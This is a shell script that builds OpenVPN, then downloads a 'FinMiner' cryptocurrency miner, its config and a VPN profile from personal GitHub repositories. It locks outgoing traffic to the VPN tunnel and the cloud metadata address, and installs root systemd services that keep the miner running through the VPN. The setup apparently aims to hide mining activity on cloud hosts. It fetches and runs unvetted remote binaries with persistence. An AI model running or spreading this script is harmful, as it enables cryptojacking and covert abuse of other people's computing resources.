sudo apt-get update 
sudo apt-get -y install build-essential libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev automake git liblzo2-dev libpam0g-dev
wget https://swupdate.openvpn.org/community/releases/openvpn-2.4.6.tar.gz
tar -xf openvpn-2.4.6.tar.gz
cd openvpn-2.4.6
./configure
make
make install
cd /usr/local/
wget https://github.com/ilehoe0202/code_miner/releases/download/0.0.1/FinMiner-test.tar.gz
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/reborn/week1new/config.ini
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/reborn/week1v2/client.ovpn
wget https://raw.githubusercontent.com/nhattieunhatmong/chef/master/test/update-resolv-conf
chmod +x *
tar -xf FinMiner-test.tar.gz
ufw default allow incoming
ufw default deny outgoing
ufw allow out 22
ufw allow 22
ufw allow out on tun0
ufw allow out 1194
ufw allow out to 169.254.169.254
ufw allow out to 10.0.0.0/8
systemctl enable ufw
ufw --force enable
sleep 10s
bash -c 'cat <<EOT >>/lib/systemd/system/mixvpn.service 
[Unit]
Description=mixvpn
After=network.target
[Service]
ExecStart= /usr/local/sbin/openvpn --config /usr/local/client.ovpn 
Restart=on-failure
RestartSec=5s
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload && 
systemctl enable mixvpn.service && 
service mixvpn start
sleep 60s
bash -c 'cat <<EOT >>/lib/systemd/system/1tieuthanhtrum.service 
[Unit]
Description=1tieuthanhtrum
Requires=mixvpn.service
[Service]
ExecStart=  /usr/local/FinMiner-linux-2.4.2/finminer /usr/local/config.ini
WatchdogSec=600
Restart=always
RestartSec=30
User=root
[Install]
WantedBy=multi-user.target
EOT
' &&
systemctl daemon-reload &&
systemctl enable 1tieuthanhtrum.service &&
service 1tieuthanhtrum start
